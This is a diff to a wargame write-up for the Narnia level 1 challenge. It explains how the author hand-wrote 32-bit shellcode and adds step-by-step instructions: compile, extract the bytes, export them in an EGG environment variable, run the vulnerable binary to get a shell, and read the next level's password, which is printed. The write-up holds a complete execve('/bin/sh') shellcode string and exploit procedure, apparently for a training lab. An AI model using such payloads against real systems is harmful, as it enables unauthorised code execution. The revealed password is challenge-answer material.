@@ -37,7 +37,25 @@ Next I tried with Assembly, but ran into a problem: none of the assembly I would
 
 The next challenge was getting `execve` (the command that switches the current process with another) to run. The command takes three params, the second being an array and I struggled to get this working - bearing in mind I set myself a limit that I must write the code, and I must understand it. I could have just copied something, copied some assembly script, but I didn't want to do that. All the same, the final solution was a bit of a copout - it seems that linux doesn't actually require you to use execve properly, at least not in assembly: you can leave param two null and it works fine :) The first shell code I got working is [here in shellcode-64bit.asm](./narnia01/shellcode-64bit.asm), and was successfully tested in [this C testprog](./narnia01/testprog.c).
 
-*However*, this also didn't work: while the shellcode worked fine whenever I used my own test programs, or even compiled nearly identical test programs on the remote host with the code injected in, it failed with narnia1. I got a mix of seg faults and illegal instructions - the former I am not sure, but the latter I eventually figured out: while the machine is x86_64, the narnia1 executable *itself* is 32 bit. So I need 32 bit shellcode, which I created [here in shellcode-32bit.asm](./narnia01/shellcode-32bit.asm).
+*However*, this also didn't work when used on the narnia program: while the shellcode worked fine whenever I used my own test programs, or even compiled nearly identical test programs on the remote host with the code injected in, it failed with narnia1. I got a mix of seg faults and illegal instructions - the former I am not sure, but the latter I eventually figured out: while the machine is x86_64, the narnia1 executable *itself* is 32 bit. So I need 32 bit shellcode, which I created [here in shellcode-32bit.asm](./narnia01/shellcode-32bit.asm) via a simple conversion (`int $0x80` instead of `syscall`, some different registers and constants being used).
+
+## Steps to use exploit:
+
+1. Copy or create a file called `shellcode.s` on the Narnia machine, containing the contents of [shellcode-32bit.asm](./narnia01/shellcode-32bit.asm)
+2. Compile as a 32 bit executable via `gcc -m32 -nostdlib shellcode.s -o shellcode.so`
+3. Use `objdump -d ./shellcode.so` to get the assembly dump.
+4. Combine all machine code numbers (the second column of hex pairs) together sequentially with `\x` prefixing each.
+
+    E.g. if the machine code is the lines `eb 0e`, `31 db`, `5b` then combined its `\xeb\x0e\x31\xdb\x5b`
+
+5. Set the environment variable to the result using a command that parses escape sequences, e.g. on my run I used `echo -e` and the command was:
+
+    `export EGG=$(echo -e "\xeb\x0e\x31\xdb\x5b\x31\xc9\x31\xd2\x31\xc0\x83\xc0\x0b\xcd\x80\xe8\xed\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68")`
+
+6. Run narnia1: `/narnia/narnia1`
+7. All going well, you should get a shell. Run the command `cat /etc/narnia_pass/narnia2` to get the password for narnia2.
+
+The password for narnia2 is **`nairiepecu`**.
 
 Useful resources: 
 
